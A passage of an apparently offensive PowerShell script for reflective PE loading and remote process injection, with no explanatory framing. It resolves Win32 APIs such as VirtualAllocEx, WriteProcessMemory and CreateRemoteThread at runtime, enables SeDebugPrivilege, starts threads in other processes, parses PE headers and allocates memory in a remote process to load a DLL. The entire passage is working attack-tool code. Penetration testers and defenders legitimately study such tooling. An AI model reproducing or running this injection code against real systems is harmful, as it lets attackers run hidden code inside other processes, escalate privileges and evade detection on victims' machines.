		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}
	

			
	
	
	

	
	
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw ""Cannot subtract bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw ""Cannot add bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw ""Cannot compare byte arrays of different size""
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = ""EndAddress"", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = ""Size"", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq ""Size"")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw ""Trying to write to memory smaller than allocated address range. $DebugString""
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw ""Trying to write to memory greater than allocated address range. $DebugString""
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw ""Unable to get the handle to the current thread""
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw ""Unable to impersonate self""
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw ""Unable to OpenThreadToken.""
				}
			}
			else
			{
				Throw ""Unable to OpenThreadToken. Error code: $ErrorCode""
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, ""SeDebugPrivilege"", $PLuid)
		if ($Result -eq $false)
		{
			Throw ""Unable to call LookupPrivilegeValue""
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose ""Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress""
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw ""Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError""
			}
		}
		
		else
		{
			Write-Verbose ""Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress""
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose ""Error creating remote thread, thread handle is null""
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw ""Invalid IMAGE_NT_HEADER signature.""
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	
	
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw ""PE file is not an EXE or DLL""
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process""
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
